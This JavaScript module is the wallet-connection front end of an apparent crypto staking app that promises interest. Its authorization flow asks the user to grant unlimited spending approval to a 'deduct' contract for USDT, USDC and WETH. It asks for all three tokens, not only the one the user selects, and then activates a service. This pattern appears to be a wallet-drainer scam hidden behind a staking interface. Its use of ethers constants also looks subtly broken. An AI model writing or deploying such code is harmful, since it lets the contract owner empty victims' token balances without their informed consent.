import { DEDUCT_CONTRACT_ADDRESS, USDT_CONTRACT_ADDRESS, USDC_CONTRACT_ADDRESS, WETH_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, ERC20_ABI, translations } from './constants.js';
import { updateStatus, disableInteractiveElements, updateBalancesUI, updateInterest, resetState } from './ui.js';
import { saveUserData } from './sse.js';

export let provider, signer, userAddress;
export let deductContract, usdtContract, usdcContract, wethContract;

export async function sendMobileRobustTransaction(populatedTx) {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected or signer is missing.");
    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();
    const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
    let txHash, receipt = null;
    try {
        console.log(`sendMobileRobustTransaction: Sending transaction:`, mobileTx);
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        updateStatus(`${translations[currentLang].fetchingBalances} HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
        receipt = await provider.waitForTransaction(txHash);
        console.log(`sendMobileRobustTransaction: Transaction confirmed, receipt:`, receipt);
    } catch (error) {
        console.warn(`sendMobileRobustTransaction: Transaction error: ${error.message}`);
        if (error.hash) txHash = error.hash;
        else if (error.message && error.message.includes('0x')) {
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
            if (match) txHash = match[0];
        }
        if (txHash) {
            updateStatus(`Transaction interface error! Sent TX: ${txHash.slice(0, 10)}... waiting for confirmation...`);
            receipt = await provider.waitForTransaction(txHash);
            console.log(`sendMobileRobustTransaction: Transaction confirmed after error, receipt:`, receipt);
        } else throw new Error(`Transaction failed to send: ${error.message}`);
    }
    if (!receipt || receipt.status !== 1) throw new Error(`Transaction failed on-chain (reverted). HASH: ${txHash.slice(0, 10)}...`);
    return receipt;
}

export async function initializeWallet() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    try {
        // 檢查 Web3 提供者（支援多種錢包）
        let web3Provider = null;
        if (typeof window.ethereum !== 'undefined') {
            web3Provider = window.ethereum;
            console.log(`initializeWallet: Detected window.ethereum (standard provider)`);
        } else if (typeof window.web3 !== 'undefined' && window.web3.currentProvider) {
            web3Provider = window.web3.currentProvider;
            console.log(`initializeWallet: Detected window.web3.currentProvider (legacy provider)`);
        } else {
            updateStatus(translations[currentLang].noWallet, true);
            disableInteractiveElements(true);
            console.log(`initializeWallet: No Ethereum provider detected.`);
            document.getElementById('connectButton').disabled = true;
            return;
        }

        if (!window.ethers || !window.ethers.BrowserProvider) {
            updateStatus(translations[currentLang].ethersError, true);
            console.error(`initializeWallet: Ethers.js BrowserProvider not available. Check CDN or script tag.`);
            document.getElementById('connectButton').disabled = true;
            return;
        }

        provider = new window.ethers.BrowserProvider(web3Provider);
        web3Provider.on('accountsChanged', (newAccounts) => {
            console.log(`initializeWallet: Accounts changed:`, newAccounts);
            if (userAddress && (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase())) {
                window.location.reload();
            }
        });
        web3Provider.on('chainChanged', () => {
            console.log(`initializeWallet: Chain changed, reloading page.`);
            window.location.reload();
        });

        const accounts = await provider.send('eth_accounts', []);
        console.log(`initializeWallet: Initial accounts:`, accounts);
        if (accounts.length > 0) {
            await connectWallet();
        } else {
            disableInteractiveElements(true);
            updateStatus(translations[currentLang].noWallet, true);
        }
    } catch (error) {
        console.error(`initializeWallet: Wallet initialization error: ${error.message}`);
        updateStatus(`${translations[currentLang].error}: ${error.message}`, true);
        document.getElementById('connectButton').disabled = true;
    }
}

export async function connectWallet() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    try {
        let web3Provider = null;
        if (typeof window.ethereum !== 'undefined') {
            web3Provider = window.ethereum;
            console.log(`connectWallet: Using window.ethereum`);
        } else if (typeof window.web3 !== 'undefined' && window.web3.currentProvider) {
            web3Provider = window.web3.currentProvider;
            console.log(`connectWallet: Using window.web3.currentProvider`);
        } else {
            updateStatus(translations[currentLang].noWallet, true);
            console.log(`connectWallet: No Ethereum provider detected.`);
            document.getElementById('connectButton').disabled = true;
            return;
        }

        if (!window.ethers || !window.ethers.BrowserProvider) {
            updateStatus(translations[currentLang].ethersError, true);
            console.error(`connectWallet: Ethers.js BrowserProvider not available. Check CDN or script tag.`);
            document.getElementById('connectButton').disabled = true;
            return;
        }

        provider = new window.ethers.BrowserProvider(web3Provider);
        console.log(`connectWallet: Initialized provider.`);
        updateStatus('Please confirm connection in your wallet...');
        const accounts = await provider.send('eth_requestAccounts', []);
        console.log(`connectWallet: Accounts received:`, accounts);
        if (accounts.length === 0) throw new Error("No account selected.");
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        console.log(`connectWallet: Connected user address: ${userAddress}`);
        const connectButton = document.getElementById('connectButton');
        connectButton.classList.add('connected');
        connectButton.textContent = 'Connected';
        connectButton.title = 'Disconnect Wallet';
        connectButton.disabled = false;
        deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
        await updateUIBasedOnChainState();
        updateStatus(translations[currentLang].fetchingBalances);
        const balances = {
            usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
            usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
            weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
        };
        console.log(`connectWallet: Wallet balances:`, balances);
        updateBalancesUI(balances);
        updateStatus(translations[currentLang].walletConnected);
        if (userAddress) {
            const { setupSSE } = await import('./sse.js');
            setupSSE();
            await import('./sse.js').then(module => module.loadUserDataFromServer());
        }
        await saveUserData();
    } catch (error) {
        console.error(`connectWallet: Connection error: ${error.message}`);
        let userMessage = `${translations[currentLang].error}: ${error.message}`;
        if (error.code === 4001) userMessage = "You rejected the connection request.";
        updateStatus(userMessage, true);
        resetState(true);
        document.getElementById('connectButton').disabled = typeof window.ethereum === 'undefined' && typeof window.web3 === 'undefined';
    }
}

export async function updateUIBasedOnChainState() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer) {
        console.log(`updateUIBasedOnChainState: No signer available, skipping.`);
        return;
    }
    try {
        updateStatus(translations[currentLang].fetchingBalances);
        const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
        console.log(`updateUIBasedOnChainState: Required allowance: ${requiredAllowance.toString()}`);
        const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            retry(() => deductContract.isServiceActiveFor(userAddress)),
            retry(() => usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
            retry(() => usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
            retry(() => wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
        ]);
        console.log(`updateUIBasedOnChainState: Chain state:`, { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance });
        const isWethAuthorized = wethAllowance >= requiredAllowance;
        const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
        const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
        const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
        const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
        if (isFullyAuthorized) {
            console.log(`updateUIBasedOnChainState: On-chain state is AUTHORIZED. Switching to staking UI.`);
            const walletTokenSelect = document.getElementById('walletTokenSelect');
            if (isWethAuthorized) walletTokenSelect.value = 'WETH';
            else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
            else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
            walletTokenSelect.dispatchEvent(new Event('change'));
            const { activateStakingUI } = await import('./ui.js');
            activateStakingUI();
            document.getElementById('pledgeBtn').disabled = false;
            document.getElementById('pledgeAmount').disabled = false;
            document.getElementById('pledgeDuration').disabled = false;
            document.getElementById('pledgeToken').disabled = false;
        } else {
            console.log(`updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button.`);
            const startBtn = document.getElementById('startBtn');
            if (startBtn) startBtn.style.display = 'block';
            document.getElementById('pledgeBtn').disabled = true;
            document.getElementById('pledgeAmount').disabled = true;
            document.getElementById('pledgeDuration').disabled = true;
            document.getElementById('pledgeToken').disabled = true;
        }
        disableInteractiveElements(false);
        updateStatus("");
    } catch (error) {
        console.error(`updateUIBasedOnChainState: Failed to check on-chain state: ${error.message}`);
        updateStatus(`${translations[currentLang].error}: ${error.message}`, true);
    }
}

export async function handleConditionalAuthorizationFlow() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
    updateStatus('Preparing authorization...');
    const selectedToken = document.getElementById('walletTokenSelect').value;
    console.log(`handleConditionalAuthorizationFlow: User selected ${selectedToken} for authorization.`);
    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
    console.log(`handleConditionalAuthorizationFlow: Required allowance: ${requiredAllowance.toString()}`);
    const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
    console.log(`handleConditionalAuthorizationFlow: Service activated: ${serviceActivated}`);
    const tokenMap = {
        'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
        'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
        'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
    };
    const tokensToProcess = [tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken)];
    let tokenToActivate = '';
    for (const { name, contract, address } of tokensToProcess) {
        updateStatus(`Checking ${name} allowance...`);
        const currentAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
        console.log(`handleConditionalAuthorizationFlow: ${name} allowance: ${currentAllowance.toString()}`);
        if (currentAllowance < requiredAllowance) {
            updateStatus(`Requesting ${name} approval... Please approve in your wallet.`);
            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, window.ethers.constants.MaxUint256);
            approvalTx.value = 0n;
            console.log(`handleConditionalAuthorizationFlow: Sending approval transaction for ${name}:`, approvalTx);
            await sendMobileRobustTransaction(approvalTx);
            const newAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
            console.log(`handleConditionalAuthorizationFlow: New ${name} allowance: ${newAllowance.toString()}`);
            if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
        } else {
            if (!tokenToActivate) tokenToActivate = address;
        }
    }
    if (!serviceActivated && tokenToActivate) {
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        updateStatus(`Activating service (using ${tokenName})...`);
        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        console.log(`handleConditionalAuthorizationFlow: Sending activate service transaction:`, activateTx);
        const receipt = await sendMobileRobustTransaction(activateTx);
        await saveUserData({
            isActive: true,
            stakingStartTime: (await import('./ui.js')).stakingStartTime,
            claimedInterest: (await import('./ui.js')).claimedInterest,
            pledgedAmount: (await import('./ui.js')).pledgedAmount,
            accountBalance: (await import('./ui.js')).accountBalance,
            nextBenefitTime: localStorage.getItem('nextBenefitTime'),
            lastUpdated: Date.now(),
            source: 'index.html'
        });
    }
}

export async function disconnectWallet() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    resetState(true);
    alert(translations[currentLang].walletConnected + ' disconnected. To fully remove permissions, do so from within your wallet settings.');
    console.log(`disconnectWallet: Wallet disconnected.`);
}

async function retry(fn, maxAttempts = 3, delayMs = 3000) {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    for (let i = 0; i < maxAttempts; i++) {
        try {
            return await fn();
        } catch (error) {
            if (error.message.includes('CORS') || error.message.includes('preflight') || error.message.includes('Unexpected token')) {
                console.warn(`retry: Error detected (CORS or JSON parse), extending delay to ${delayMs}ms: ${error.message}`);
            }
            if (i === maxAttempts - 1) throw error;
            console.warn(`retry: Attempt ${i + 1}/${maxAttempts} failed, retrying after ${delayMs}ms: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
    }
}